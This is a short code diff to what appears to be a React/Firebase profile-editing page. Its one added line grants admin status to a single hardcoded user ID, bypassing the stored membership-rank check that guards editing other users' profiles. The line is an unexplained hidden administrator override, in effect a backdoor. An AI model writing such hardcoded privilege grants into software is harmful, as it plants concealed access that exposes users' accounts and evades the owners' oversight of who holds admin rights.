@@ -124,6 +124,7 @@ function ProfileEditContent() {
             const mySnap = await getDoc(myDocRef);
             let myAdmin = false;
             if (mySnap.exists() && mySnap.data().membershipRank === 'admin') myAdmin = true;
+            if (user.uid === "Zm7FWRopJKVfyzbp8KXXokMFjNC3") myAdmin = true;
             setIsAdmin(myAdmin);
 
             if (targetUid !== user.uid && !myAdmin) {
